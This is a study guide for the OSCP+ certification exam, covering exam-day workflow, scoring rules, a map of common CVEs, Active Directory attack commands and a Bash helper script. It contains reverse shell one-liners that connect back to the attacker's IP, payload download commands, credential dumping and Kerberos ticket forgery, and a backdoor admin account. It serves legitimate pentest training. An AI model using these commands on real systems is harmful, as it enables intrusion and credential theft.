# OSCP+ KNOWLEDGE BASE — VOLUME 8
## ⭐ EXAM WAR ROOM (single pane of glass) + COMMON CVE HITS + COMMUNITY ADDENDUM

> Open this ONE page on exam day. It ties every volume together into a scoring machine.
> `$IP`=your Kali tun0 IP · `$T`=target · `$DC`=domain controller · `$DOMAIN`=domain FQDN.
> Synthesized from official OffSec rules + widely-used community notes (see `[SOURCES]` in Vol 6). Verify tool/flag syntax against your installed versions — don't run blind.

---

# [HOW-TO-READ-THIS]  👋 completely new? Read this first (5 minutes)

This knowledge base is a **field manual for hacking practice machines**, not a textbook. Here's everything you need to use it.

## What the whole process looks like (the big picture)
Every machine, start to finish, is the same five steps:
```
1. SCAN      →  find which "doors" (ports/services) are open        (Volume 1)
2. ENUMERATE →  look closely at each service for a weakness         (Volumes 1–2)
3. EXPLOIT   →  use that weakness to get a "shell" (command access) (Volume 3)
4. ESCALATE  →  go from a normal user to root/SYSTEM (full control) (Volume 4)
5. (if it's a domain) spread to other machines → own the DC         (Volume 5)
Along the way: read the flags (local.txt, then proof.txt) to prove you did it.
```

## The words you'll see everywhere (plain-English glossary)
- **Kali** = your attacking Linux computer. **Target / victim / box** = the machine you're hacking.
- **Shell** = a command prompt on the target that you control. Getting one = your first big win ("foothold").
- **Reverse shell** = the target connects back to you; you catch it with a **listener** (`nc -lvnp 443`).
- **root** = the all-powerful user on Linux. **SYSTEM** = the all-powerful user on Windows. Getting there = "privilege escalation" / "privesc".
- **Enumerate** = look around and gather information (the boring step that wins boxes).
- **Creds** = credentials = a username + password (or a key, or a hash).
- **Hash** = a password stored scrambled; you "crack" it by guessing (Volume 3).
- **Spray** = try one password against many usernames. **Pass-the-Hash** = log in with a hash instead of the password.
- **AD (Active Directory)** = a Windows company network run by a central **Domain Controller (DC)**. Own the DC = own everything (Volume 5).
- **Pivot** = tunnel through one hacked machine to reach a hidden network behind it (Volume 5).
- **Flag** = a text file (`local.txt`, `proof.txt`) that proves your access; reading it = points.
- More terms are in the full glossary: search `[GLOSSARY]` (Volume 9).

## How to read a command in this KB
Commands look like this, with a `#` explanation after most lines:
```bash
nmap -p- --min-rate 2000 -Pn -oN scans/all-tcp.txt $IP   # scan all ports on the target
```
**Placeholders you MUST replace with real values before running:**
| You see | It means | Example |
|---|---|---|
| `$IP` or `$T` | the **target's** IP | `10.10.10.5` |
| `<IP>`, `<yourKaliIP>`, `LHOST` | **your Kali's** IP (run `ip addr show tun0`) | `192.168.49.52` |
| `$U` / `$P` | a username / password you found | `bob` / `Summer2025!` |
| `$DC`, `$DOMAIN` | the Domain Controller's IP / the domain name | `10.10.10.10` / `corp.local` |
| `<anything>` | "put your own value here" | — |
**Do this once when you start a box** so the `$IP` in every command works:
```bash
export IP=10.10.10.5      # set the target IP (change to yours)
mkdir -p scans            # make the folder that scan commands save into
```

## The tags in [SQUARE BRACKETS]
A tag like `[ENUM-SMB]` is a **bookmark**. When a line says "→ `[SHELL-QUICK]`" it means "go read that section next". To jump: press **Ctrl+F**, type the tag, hit Enter. Difficulty labels:
- **`[MUST-MEMORIZE]`** = learn it by heart. **`[MUST-RECOGNIZE]`** = just know what it does. **`[LOOK-UP]`** = niche; look it up when you need it.

## The 3 rules that matter most
1. **Enumerate everything before attacking anything.** Rushing the first port is why beginners fail.
2. **Every credential you find → try it EVERYWHERE** (every service, every user). Password reuse wins boxes.
3. **When stuck, go back and enumerate more.** The answer is almost always something you haven't looked at yet — not a cleverer exploit.

## Where to go now
- Brand new to the tools/Kali? → Volume 9 (`[KALI-SETUP]`, `[GLOSSARY]`, first-box walkthroughs).
- Ready to attack a box? → start at Volume 1 (`[NMAP-QUICK]`) and follow the "→" links.
- On exam day? → the rest of THIS page (the War Room) is your minute-by-minute plan.

---

# [EXAM-WAR-ROOM]  🎯 the day-of single reference

## 0) THE SCOREBOARD (know exactly what wins)
```
100 pts total · need 70 · NO bonus points · 23h45m + 24h report
┌─────────────────────────────┬───────┬──────────────────────────────┐
│ AD SET (3 chained hosts)    │  40   │ all-or-nothing → DO FIRST     │
│ Standalone A                │  20   │ 10 local.txt + 10 proof.txt   │
│ Standalone B                │  20   │ 10 local.txt + 10 proof.txt   │
│ Standalone C                │  20   │ 10 local.txt + 10 proof.txt   │
└─────────────────────────────┴───────┴──────────────────────────────┘
WINNING COMBOS (any = pass):
  AD 40 + two boxes fully rooted (40) = 80 ✅   ← the target plan
  AD 40 + one box rooted (20) + two low-priv flags (20) = 80 ✅
  No AD, all three rooted (60) = 60 ✗  ← why AD is non-negotiable
RULE OF THUMB: a low-priv flag (10) you can grab in 20 min beats 2h on a root you can't reach.
```

## 0.5) [EXAM-RULES-2026] ⛔ don't get points VOIDED (verify on the current official guide)
```
ALLOWED : your own notes (this KB), public exploits you understand + run manually,
          nmap/NSE, nikto, dirb/feroxbuster/ffuf/gobuster, netexec/CME, impacket,
          evil-winrm, BloodHound/SharpHound, PowerView, Rubeus, mimikatz, chisel/ligolo,
          hashcat/john, msfvenom + multi/handler (on ALL boxes), searchsploit,
          msf-pattern_create / nasm_shell. PowerShell Core / PSSession = a valid interactive shell.
BANNED  : ⛔ AI / LLM chatbots during BOTH the exam AND the report phase (ChatGPT, KAI, etc.)
          ⛔ sqlmap and other AUTO-exploitation tools (sqlninja, db_autopwn, browser_autopwn) — do SQLi MANUALLY
          ⛔ mass/auto vuln scanners (Nessus, OpenVAS, Nexpose)
          ⛔ Responder/Inveigh POISONING & spoofing (LLMNR/NBNS/WPAD, `-w`), ARP/DNS spoof, bettercap
             → Responder ANALYZE mode (`-A`) only; capture NTLM by hosting an SMB server that a
               file (.scf/.url/.lnk) the victim opens authenticates to — that's fine, poisoning is not
          ⛔ commercial tools (Burp Pro, Metasploit Pro)
METASPLOIT: modules (exploit/post) + Meterpreter = ONE target only; once used on a box you're locked to it;
            NOT for pivoting. (msfvenom + multi/handler are exempt and usable everywhere.)
REVERTS  : 24 available; the limit can be reset ONCE if you run out.
NOTE     : This KB is STATIC personal notes = allowed. Asking a live AI during the exam = banned. Comply.
```

## [PRE-EXAM-SETUP]  📋 copy-paste this (one block, run top-to-bottom)

### A) THE DAY BEFORE — one-time, ~15 min (full detail in `[KALI-SETUP]`)
```
sudo apt update && sudo apt full-upgrade -y
sudo apt install -y seclists feroxbuster ffuf gobuster nikto smbclient smbmap enum4linux \
  netexec impacket-scripts evil-winrm responder proxychains4 hashcat john hydra dnsrecon nmap
pipx install bloodhound
sudo gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null   # one time; ignore "not found" if already done
# tools you COPY TO targets — download once into ~/tools (from each project's GitHub Releases):
mkdir -p ~/tools/{linux,windows}
#   linux/  : linpeas.sh  pspy64  chisel  (ligolo) agent+proxy
#   windows/: winPEASx64.exe  PrintSpoofer64.exe  GodPotato.exe  nc.exe  chisel.exe
#             PowerView.ps1  PowerUp.ps1  SharpHound.exe  mimikatz.exe  RunasCs.exe
# then TEST: VPN connects · screenshot tool works · notes app open · OSCP-KB.html pinned
```

### B) EXAM MORNING — first 5 min (run these once the clock starts)
```
# 1) connect the exam VPN, then confirm your address (this is your LHOST / $IP):
ip addr show tun0 | grep inet
# 2) build your workspace + start a command logger (saves everything for the report):
mkdir -p ~/oscp/{AD1,AD2,AD3,ST-A,ST-B,ST-C}/{scans,loot,exploits,www}
cd ~/oscp && script -q session-$(date +%F).log
# 3) serve your tools so targets can pull them (leave running in a tab):
cd ~/tools/linux && python3 -m http.server 80 &
# 4) set your Kali IP + per-target IP as shell vars so all KB commands paste-and-run:
export IP=10.10.14.x            # <-- your tun0 address from step 1 (LHOST)
#    for each box you work:  T=<target-ip> ; cd ~/oscp/<box>    (then paste nmap etc. using $T)
# 5) read the control-panel brief: starting creds? hostnames? domain? which IPs are AD vs standalone?
```
> After this, the folders (`scans/ loot/ …`) exist, so `nmap -oN scans/all-tcp.txt $T` won't error, `$IP`/`$T` are set so commands paste cleanly, and every command is logged for your report. Then go to **§1 / §2** below.

## 1) PRE-FLIGHT (day before + first 10 min)  → `[EXAM-DAY-FLOW]` Phase 0
```
[ ] VPN, VM, screenshot tool, notes app all tested
[ ] OSCP-KB.html pinned in a browser tab
[ ] Folder skeleton + command logger ready:
    mkdir -p ~/oscp/{AD1,AD2,AD3,ST-A,ST-B,ST-C}/{scans,loot,exploits,www}
    script -q ~/oscp/session-$(date +%F).log
[ ] Read the control-panel brief: starting creds? hostnames? domain? which IPs are AD vs standalone? → paste into notes
[ ] Confirm each target IP responds (nmap -sn / -Pn)
```

## 2) LAUNCH ALL SCANS IN PARALLEL (first 20–30 min)  → `[NMAP-QUICK]`
Run per target in separate tabs. **Don't wait** — while these run, start web enum on anything with 80/443.
```
# fast all-ports (every target at once):
nmap -p- --min-rate 2000 -Pn -oN scans/all-tcp.txt $T
# then deep on the open ports:
nmap -p<csv> -sCV -Pn -oN scans/scv.txt $T
# UDP top-100 (backgrounded):
nmap -sU --top-ports 100 --min-rate 1000 -Pn -oN scans/udp.txt $T
```
As results land, route each port with `[ENUM-DECISION]` (Vol 1). **Golden rule: map everything before exploiting anything.**

---

## 2.5) [EXAM-ORDER-DEBATE] which target first? (two valid schools — pick yours)
```
SCHOOL A "AD first":     do the AD set while your brain is freshest — it's the 40-pt all-or-nothing
                         block and the hardest to grind tired. (This KB's default.)
SCHOOL B "bank first":   root 1–2 standalones first (cap ~4–5h) to lock guaranteed points + build
                         momentum/confidence, THEN hit AD with a lead on the board.
PICK: AD weak/nervous → School A (fresh brain on the hard thing). Want a safety cushion / calmer start
      → School B. EITHER WAY: don't leave AD until you're too tired to think — it's where 40 pts live.
```

## 3) THE THREE PLAYBOOKS (per machine — follow exactly)

### 🟥 PLAYBOOK: AD SET (do FIRST, ~hrs 0.5–8) — worth 40, chained
```
STEP 1  Foothold the ENTRY host (treat it like a standalone):
        web vuln / service exploit / provided cred → shell → stabilize [SHELL-QUICK]
STEP 2  Loot locally: [WINDOWS-PRIVESC-QUICK] + [CREDENTIALS-SOURCES]
        secretsdump/mimikatz, cmdkey, PS history, configs, files → collect EVERY cred/hash
STEP 3  First domain credential → pivot the whole approach to AD:
        sudo ntpdate $DC                                   # fix clock skew FIRST
        bloodhound-python -u U -p P -d $DOMAIN -ns $DC -c all --zip   # collect NOW
        impacket-GetUserSPNs -request $DOMAIN/U:P -dc-ip $DC          # Kerberoast → -m 13100
        impacket-GetNPUsers $DOMAIN/ -no-pass -usersfile users.txt -dc-ip $DC  # AS-REP → -m 18200
        nxc smb <all-hosts> -u U -p P --continue-on-success          # SPRAY every cred
STEP 4  Follow BloodHound "shortest path from Owned" → execute edges [AD-ACL]:
        crack a roast → reuse; ACL abuse (GenericAll/WriteDACL/ForceChangePassword);
        lateral move [AD-LATERAL] (evil-winrm / wmiexec / psexec) → dump creds on each host → repeat
STEP 5  Reach DC → [AD-DCSYNC]:  impacket-secretsdump $DOMAIN/U:P@$DC
        → PtH Administrator to DC + member server + workstation → read ALL proof.txt
DECISION: zero AD progress at ~3–4h → bank a standalone, return fresh (don't burn the day here).
TRICKS: (1) always Kerberoast+AS-REP even with low creds — free.  (2) spray EVERY new password on
        EVERY host.  (3) service accounts are often admins — check their BloodHound node.
        (4) clock skew masquerades as "bad creds" — ntpdate first.
```

### 🟦 PLAYBOOK: STANDALONE LINUX — worth 20 (10+10)
```
STEP 1  From scans → [ENUM-DECISION] → enumerate every service (Vol 1). Web? → full [WEB-QUICK].
STEP 2  Foothold [FOOTHOLD-CHECKLIST], cheapest first:
        default/weak creds → creds you already found → known-version exploit [EXPLOIT-RESEARCH]/[CVE-HITS]
        → web vuln (upload>cmdinj>SQLi-RCE>LFI-RCE>SSTI)
STEP 3  Shell → stabilize [SHELL-QUICK] (python pty; stty raw -echo; fg).
        *** grab & SCREENSHOT local.txt NOW ***  (10 pts banked):
        cat local.txt; id; ip a        → screenshot all three together
STEP 4  Privesc [LINUX-PRIVESC-QUICK] — first 4:
        id; sudo -l; find / -perm -4000 2>/dev/null; getcap -r / 2>/dev/null   → then linpeas
        Quick wins order: sudo(GTFOBins) → SUID(GTFOBins/PwnKit) → cron/writable script →
        caps → creds in configs/history → kernel (DirtyPipe/PwnKit) LAST
STEP 5  Root → *** SCREENSHOT proof.txt NOW ***: cat proof.txt; id; ip a
        → loot /etc/shadow, SSH keys, configs for OTHER boxes.
```

### 🟩 PLAYBOOK: STANDALONE WINDOWS — worth 20 (10+10)
```
STEP 1  Enumerate services (SMB/HTTP/WinRM/MSSQL common) → [ENUM-DECISION].
STEP 2  Foothold: creds+evil-winrm / SMB / web upload (aspx) / service exploit [CVE-HITS].
STEP 3  Shell → *** SCREENSHOT local.txt NOW ***: type local.txt & whoami & ipconfig
STEP 4  Privesc [WINDOWS-PRIVESC-QUICK] — first move:
        whoami /priv   → SeImpersonate/SeAssignPrimaryToken? → PrintSpoofer/GodPotato = SYSTEM (instant win)
        else: winPEAS + PowerUp Invoke-AllChecks → service perms / unquoted path / AlwaysInstallElevated /
        saved creds (cmdkey→runas /savecred) / autologon reg
STEP 5  SYSTEM → *** SCREENSHOT proof.txt NOW ***: type proof.txt & whoami & ipconfig
        → secretsdump SAM/SYSTEM, LSASS, cmdkey, DPAPI for OTHER boxes.
TRICK: SeImpersonate on a service/web/MSSQL account is the single most common Windows root path — check it first.
```

## 4) TIME CHECKPOINTS (glance at the clock, make the call)
```
Hr 0–0.5   all scans launched, brief read, folders ready
Hr 0.5–8   AD SET (fresh brain). If dead at ~3–4h → switch to a standalone, return
Hr 8–16    standalones, 30-min rotation. New cred → spray on ALL boxes
Hr 10–15   SLEEP 4–6h (fatigue = tunnel vision; grinding tired loses points)
Hr 16–20   re-attack stuck boxes fresh; grab remaining low-priv 10-pointers
Hr 20–23   STOP HACKING. Verify every proof screenshot exists. Re-take missing ones NOW.
           Enter all flags in the control panel.
+24h       write & upload the report ([REPORTING]) — no report = no pass
```

## 5) ALWAYS-TRY QUICK WINS (the point-grabbers)  → `[CHAIN-*]`, `[FOUND-*]`
```
□ Anonymous access: FTP anon, SMB null/guest, NFS showmount, LDAP anon, Redis/Mongo unauth
□ Default/weak creds on every login (admin:admin, product defaults, Company1!, Season+Year!)
□ Reuse EVERY found credential on EVERY service (SMB/WinRM/SSH/RDP/MSSQL/web/LDAP) + as other users
□ searchsploit every versioned service/CMS → [CVE-HITS]
□ Web: /robots.txt, source/JS for creds, dir+vhost brute, upload forms, ?param= for LFI/SQLi/cmdinj
□ SNMP public → snmpwalk (creds in process args), zone transfer (dig axfr)
□ SMB shares: GPP Groups.xml (cpassword), unattend.xml, scripts, .kdbx, backups
□ Linux: sudo -l, SUID+GTFOBins, cron, caps, ~/.ssh, history, config passwords
□ Windows: whoami /priv (SeImpersonate→Potato), cmdkey, unattend.xml, PS history, AlwaysInstallElevated
□ AD: Kerberoast + AS-REP (free), BloodHound, spray, GPP
```

## 6) STUCK? (15/30 rule)  → `[STUCK-PROTOCOL]`
```
15 min no progress → RE-READ your nmap/tool output; you missed a port/service/version/param
30 min no new hypothesis → SWITCH target; write EXACTLY where you stopped
Triggers to abandon: retrying variants, editing an exploit you don't understand, brute-forcing on a hunch
Broken shell/exploit → [TROUBLESHOOTING-QUICK]. Weird box behavior → REVERT (free).
Re-enumerate after EVERY new access (user/host/subnet) — new surface appears.
```

## 7) PROOF CAPTURE (do NOT lose points here)  → `[REPORTING-CHECKLIST]`
```
Every owned host, ONE screenshot showing all three together:
  Linux:   cat proof.txt; id; ip a
  Windows: type proof.txt & whoami & ipconfig
Name files: <host>_<ip>_<local|proof>.png   e.g. web01_10.1.1.5_proof.png
Enter each flag string in the control panel. Keep the command log (script) for report repro.
Screenshot the EXPLOIT working too (not just the flag).
```

---

# [CVE-HITS]  common OSCP vulnerable-software → exploit map
**⚠️ VERIFY the exact version + arch + auth before running. This is a lead list, not a guarantee. Prefer the manual technique; MSF only on your ONE allowed box.**

### Services / Web (foothold)
```
vsftpd 2.3.4                → backdoor (CVE-2011-2523) → root shell on :6200
ProFTPd 1.3.5               → mod_copy SITE CPFR/CPTO (CVE-2015-3306) → write webshell
Samba 3.0.20–3.0.25         → usermap_script (CVE-2007-2447) → RCE
Apache 2.4.49 / 2.4.50      → path traversal→RCE (CVE-2021-41773 / -42013)
Shellshock (bash CGI)       → CVE-2014-6271, User-Agent: () { :;}; <cmd>
PHP-CGI                     → CVE-2012-1823 (?-d args) → RCE
Rejetto HFS 2.3             → CVE-2014-6287 → RCE (classic)
Nostromo nhttpd             → CVE-2019-16278 path traversal RCE
Webmin 1.890–1.920          → CVE-2019-15107 unauth RCE
Drupal 7/8 "Drupalgeddon2"  → CVE-2018-7600 RCE
Grafana 8.x                 → CVE-2021-43798 LFI (read config → creds)
Tomcat                      → /manager default creds → deploy .war (msfvenom war); Ghostcat AJP CVE-2020-1938
Jenkins                     → script console (Groovy) → RCE; often unauth
phpMyAdmin                  → version LFI/RCE; SQL → INTO OUTFILE webshell
WordPress                   → wpscan → vuln plugin/theme; admin → theme editor RCE
ElasticSearch 1.x           → CVE-2015-1427 (Groovy) RCE
Tiny File Manager           → default creds admin:admin@123 or user:12345 → UPLOAD a .php shell → RCE
                              (also CVE-2021-45010 path traversal / CVE-2024-21646 auth issues on some vers)
CMS Made Simple / Grav / SPIP / other CMS → searchsploit the exact version; many have auth-RCE / SQLi
```
> **Web-app foothold pattern (works for ANY app, not just the named ones):** identify the app+version → (1) try **default/weak creds** → (2) `searchsploit <app> <version>` → (3) if you can log in, find an **upload / editor / template** feature → drop a webshell (`[WEB-UPLOAD]`). Named apps above are just common examples; the *pattern* is what matters.

### Windows privesc / kernel
```
SeImpersonate/SeAssignToken → PrintSpoofer / GodPotato / JuicyPotatoNG / RoguePotato → SYSTEM
PrintNightmare              → CVE-2021-1675 / CVE-2021-34527 (spooler) → SYSTEM/DC
HiveNightmare / SeriousSAM  → CVE-2021-36934 (readable SAM) → hashes
BITS arbitrary move         → CVE-2020-0787 (Bad Potato) older builds
UAC bypass (consent)        → CVE-2019-1388 (older)
SMBGhost                    → CVE-2020-0796 (SMBv3, risky/crashy)
EternalBlue                 → MS17-010 (old, unpatched → SYSTEM)
Unquoted path / weak svc DACL / AlwaysInstallElevated  → not CVEs, always check
```

### Linux privesc / kernel
```
pkexec "PwnKit"            → CVE-2021-4034 (near-universal on old boxes) → root
DirtyPipe                  → CVE-2022-0847 (kernel 5.8–5.16.11) → root
DirtyCOW                   → CVE-2016-5195 (very old) → root
sudo "Baron Samedit"       → CVE-2021-3156 → root
sudo bypass -u#-1          → CVE-2019-14287 (sudo <1.8.28, specific rule)
Polkit/pkexec variants, screen 4.5, Netfilter, OverlayFS → suggester will flag; verify kernel+distro
```

### Active Directory
```
Zerologon                  → CVE-2020-1472 (DC → reset machine acct → DCSync) — powerful, verify patch
noPac / sAMAccountName     → CVE-2021-42278 + CVE-2021-42287 → DA from any user (impacket)
PrintNightmare             → CVE-2021-34527 (spooler on DC) → SYSTEM on DC
PetitPotam / coerce        → CVE-2021-36942 → relay to ADCS (ESC8) → DC
ADCS ESC1–ESC8             → certipy (misconfigured templates → DA) [LOOK-UP]
GPP cpassword              → decrypt Groups.xml (gpp-decrypt) → creds
```

---

# [COMMUNITY-ADDENDUM]  extra field-tested commands (synthesized from public OSCP notes)

## [ADDENDUM-ENUM]
```
smbmap -H $T -u U -p P            # readable/writable shares at a glance (alt to nxc)
smbmap -H $T -u '' -p ''          # null session
nbtscan -r 192.168.x.0/24        # quick NetBIOS name sweep
enum4linux -a $T                  # classic all-in-one (enum4linux-ng preferred)
snmpwalk -v1 -c public $T 1.3.6.1.4.1.77.1.2.25   # Windows users OID
snmpwalk -v1 -c public $T 1.3.6.1.2.1.25.4.2.1.2  # running processes (creds in args)
dnsrecon -d domain -t axfr        # zone transfer; -t brt -D wordlist for brute
```

## [ADDENDUM-WEB-CMS]
```
wpscan --url http://$T --enumerate vp,vt,u --api-token <opt>   # WordPress vuln plugins/themes/users
# WP admin creds → Appearance>Theme Editor → edit 404.php to PHP shell → RCE
droopescan scan drupal -u http://$T          # Drupal
droopescan scan joomla  -u http://$T          # Joomla (also joomscan)
nikto -h http://$T                            # quick server misconfig/known-file sweep
```

## [ADDENDUM-AD-POWERVIEW]  (Windows-side enum, when you have a Windows shell)
```
# import: . .\PowerView.ps1
Get-NetDomain ; Get-NetDomainController
Get-NetUser | select samaccountname,description        # descriptions often hold creds
Get-NetUser -SPN | select samaccountname,serviceprincipalname   # kerberoastable
Get-DomainUser -PreauthNotRequired                     # AS-REP roastable
Get-NetGroup "Domain Admins" -MemberIdentity          # DA members
Get-NetComputer | select name,operatingsystem
Find-LocalAdminAccess                                  # where current user is local admin
Invoke-ShareFinder ; Get-NetGPPPassword               # GPP cpassword via PowerView
```

## [ADDENDUM-AD-TICKETS]  (recognize; mostly post-DA or specific)
```
# GPP password decrypt:
impacket-Get-GPPPassword $DOMAIN/U:P@$DC   ;   gpp-decrypt <cpassword>
# Golden ticket (after krbtgt hash via DCSync):
impacket-ticketer -nthash <krbtgt> -domain-sid <SID> -domain $DOMAIN administrator
# Silver ticket (service account hash → forge service ticket, recognize):
#   mimikatz: kerberos::golden /sid /domain /target /service:<spn> /rc4:<svc-hash> /user:<u> /ptt
# use ccache:  export KRB5CCNAME=administrator.ccache ; impacket-psexec -k -no-pass $DOMAIN/administrator@$DC
```

## [ADDENDUM-LATERAL]
```
winrs -r:$T -u:U -p:P "whoami"               # native WinRM command (from a Windows host)
nxc smb $T -u U -H <ntlm> --local-auth -x 'whoami'   # PtH local admin command exec
impacket-psexec/wmiexec/smbexec/atexec/dcomexec $DOMAIN/U:P@$T   # pick quietest that works
```

## [ADDENDUM-PIVOT]
```
sshuttle -r U@$T 172.16.5.0/24              # VPN-like pivot over SSH (no proxychains needed) — easy
# else Ligolo-ng (preferred) or Chisel SOCKS — see [PIVOT-QUICK]
```

## [ADDENDUM-CRACK]
```
fcrackzip -u -D -p rockyou.txt secret.zip    # zip password (or zip2john + john)
zip2john f.zip > h ; office2john f.docx > h ; keepass2john f.kdbx > h ; ssh2john id_rsa > h
john h --wordlist=rockyou.txt   |   hashcat -m <mode> h rockyou.txt -O
# online (only for practice/allowed, unsalted): CrackStation / hashes.com  — offline preferred on exam
```

## [ADDENDUM-MISC]
```
# add local admin (Windows, post-SYSTEM, for RDP/report repro):
net user pentest P@ssw0rd123 /add & net localgroup administrators pentest /add
# RDP in:  xfreerdp /u:U /p:P /v:$T +clipboard /dynamic-resolution
# reg-based service hijack (alt to sc config):
reg add HKLM\SYSTEM\CurrentControlSet\services\<svc> /v ImagePath /t REG_EXPAND_SZ /d C:\temp\rev.exe /f
```

---

# [EXAM-SCRIPTS]  🤖 exam-safe automation (source once → tiny commands)
> **Companion files (same folder):** `oscp.sh` (Bash — `source ~/oscp.sh`) · `oscp.py` (Python — `./oscp.py enum <ip>`) · **`OSCP-CommandGen.html`** (click-to-generate: set your IP → pick a category → Copy the ready-to-run command — reverse shells, transfer, enum, msfvenom, privesc downloads).
> ✅ **Allowed:** your own Python/Bash/Perl scripts for **enumeration / setup / workflow**, and **AutoRecon / nmapAutomator** (they do *no* auto-exploitation).
> ⛔ **Banned:** automated *exploitation* (sqlmap, MSF autopwn, Armitage, AutoSploit, Cobalt Strike). **Rule:** automate enum, never exploitation; understand every line; run auto-enum **in the background** while you manually hit 80/443/445.

## [EXAM-SCRIPTS-SETUP]  save this as `~/oscp.sh`, then `source ~/oscp.sh` once at exam start
```bash
#!/bin/bash
# ---- OSCP helper: enumeration/setup/workflow ONLY (exam-compliant) ----
_tun=$(ip -o -4 addr show tun0 2>/dev/null | awk '{print $4}' | cut -d/ -f1); [ -n "$_tun" ] && export IP="$_tun"   # VPN IP (LHOST); if tun0 down, set manually: export IP=10.10.14.x

ws(){  # ws <name> <target-ip>  → make workspace + set $T/$IP
  mkdir -p ~/oscp/"$1"/{scans,loot,exploits,www}; cd ~/oscp/"$1" || return
  export T="$2"; echo "[+] ~/oscp/$1 ready · \$T=$T · \$IP=$IP"; }

enum(){  # enum <ip>  → full TCP scan → -sCV on open ports → fan out to web/smb (BACKGROUND while you probe manually)
  local t=${1:-$T}; mkdir -p scans
  echo "[*] full TCP scan $t ..."; nmap -p- --min-rate 2000 -Pn -oN scans/all-tcp.txt "$t"
  local p; p=$(grep -oE '^[0-9]+/tcp +open' scans/all-tcp.txt | cut -d/ -f1 | paste -sd, -)
  echo "[+] open: $p"; nmap -p"$p" -sCV -Pn -oN scans/scv.txt "$t"
  nmap -sU --top-ports 100 --min-rate 1000 -Pn -oN scans/udp.txt "$t" &
  [[ ",$p," == *,80,* || ",$p," == *,443,* || ",$p," == *,8080,* ]] && { echo "[*] web"; whatweb http://"$t"; feroxbuster -u http://"$t" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html -o scans/ferox.txt & }
  [[ ",$p," == *,445,* ]] && { echo "[*] smb"; nxc smb "$t" -u '' -p '' --shares | tee scans/smb.txt; enum4linux-ng -A "$t" > scans/enum4.txt & }
  [[ ",$p," == *,88,* ]] && echo "[!] port 88 → this is a DC / AD → see [AD-QUICK]"
  echo "[+] done → read scans/scv.txt, route each port via [ENUM-DECISION]"; }

spray(){  # spray <user> <pass> <ip-or-hostfile>  → VALIDATE one cred across services (allowed; not brute-force)
  for s in smb winrm ldap mssql rdp ssh; do echo "=== $s ==="; nxc "$s" "$3" -u "$1" -p "$2" --continue-on-success 2>/dev/null; done; }

hosts(){  nxc smb "$1" 2>/dev/null | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u; }   # alive hosts on a subnet (post-pivot)
flags(){  find / -iname '*flag*' 2>/dev/null; grep -rniE 'flag\{|OS\{|password|secret' /home /var/www /opt /etc 2>/dev/null; }  # loot/flag hunt (run ON a Linux target)
addhost(){ grep -q "$2" /etc/hosts || echo "$1 $2" | sudo tee -a /etc/hosts; }   # addhost <ip> <hostname>
shell(){    # shell <bash|sh|nc|python|php|perl|ps|msf-exe> [port] → print a reverse shell with YOUR $IP filled in
  local p=${2:-443}; case "$1" in
    bash) echo "bash -c 'bash -i >& /dev/tcp/$IP/$p 0>&1'";;
    python) echo "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$IP\",$p));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")'";;
    php) echo "php -r '\$s=fsockopen(\"$IP\",$p);exec(\"/bin/sh -i <&3 >&3 2>&3\");'";;
    nc) echo "nc $IP $p -e /bin/bash   # win: nc.exe $IP $p -e cmd.exe";;
    ps) echo "powershell -e \$(printf '%s' \"...TCPClient('$IP',$p)...\" | iconv -t UTF-16LE|base64 -w0)   # (full one-liner in oscp.sh)";;
    msf-exe) echo "msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=$p -f exe -o rev.exe";;
    *) echo "usage: shell <bash|python|php|nc|ps|msf-exe> [port]  (URL-encode for web!)";; esac; }
transfer(){  # transfer <file> → print how a target pulls <file> from your Kali ('serve' the dir first)
  echo "# Linux:  wget http://$IP/$1 -O /tmp/$1  ||  curl http://$IP/$1 -o /tmp/$1"
  echo "# Windows: certutil -urlcache -split -f http://$IP/$1 $1   ||   powershell iwr http://$IP/$1 -OutFile $1"; }
alias serve='python3 -m http.server 80'                       # serve current dir to targets
alias smbserve='impacket-smbserver share $(pwd) -smb2support' # SMB drop for Windows
alias listen='nc -lvnp 443'                                    # reverse-shell listener
alias tun='ip -o -4 addr show tun0 | awk "{print \$4}"'        # show your VPN IP
echo "[+] oscp helpers loaded: ws · enum · spray · hosts · flags · addhost · shell · transfer · serve · smbserve · listen · tun"
```

## [EXAM-SCRIPTS-USE]  the whole exam, in tiny commands
```
source ~/oscp.sh                 # once, at start (sets $IP = your tun0)
ws web1 10.10.10.5               # new box → workspace + $T set
enum $T                          # auto full-scan + service scan + web/smb fan-out (read scans/, probe manually meanwhile)
# ...found a credential 'bob:Summer2025!' ...
spray bob 'Summer2025!' $T       # does it work on smb/winrm/ldap/mssql/rdp/ssh here?
spray bob 'Summer2025!' hosts.txt   # ...and on every other host?
serve                            # (in a spare tab) host linpeas etc.
listen                           # (in a spare tab) catch your shell
shell bash                       # print a bash reverse shell with your $IP filled in (paste into RCE)
shell ps 443                     # print a base64 PowerShell reverse shell for a Windows target
transfer linpeas.sh              # print the wget/certutil line to pull a file onto the target
flags                            # ON a shell → hunt the flag / creds
```
**Windows-side loot (paste in a PS shell):**
```
Get-ChildItem C:\ -Recurse -Force -EA SilentlyContinue -Include *flag*,*.kdbx,*.config | Select FullName
Select-String -Path C:\Users\*\* -Pattern 'OS\{|flag|password' -List -EA SilentlyContinue
```

## [EXAM-SCRIPTS-FILEMAP]  where everything lives (on your Kali)
```
~/oscp.sh                     the helper functions → source ~/oscp.sh once at start
~/tools/{linux,windows}/      binaries you push to targets (linpeas, winpeas, chisel, ligolo, potatoes, mimikatz)
~/oscp/<box>/scans/           auto-created by `ws`/`enum` → nmap + service output
~/oscp/<box>/{loot,exploits,www}/   creds/keys · exploit code · files to serve
~/oscp/session-YYYY-MM-DD.log  your command log (started by `script`) → for the report
/usr/share/wordlists/rockyou.txt · /usr/share/seclists/ · /usr/share/webshells/   Kali-provided
```
**What to automate:** ✅ setup · enumeration · cred validation/spray · host discovery · local-enum (peas) · BloodHound collect · workflow glue (shell/transfer/serve). ⛔ NEVER automate *exploitation* (sqlmap/autopwn/Armitage), mass scanners (Nessus/OpenVAS), or AI-solving. **Rule: automate up to "vuln identified" → exploit manually.**

## [EXAM-SCRIPTS-COMMUNITY]  ready-made enum tools (allowed — background them)
```
autorecon $T                      # multi-threaded auto-enum, no exploitation → github.com/Tib3rius/AutoRecon
nmapAutomator.sh -H $T -t All     # staged enum → github.com/21y4d/nmapAutomator
```
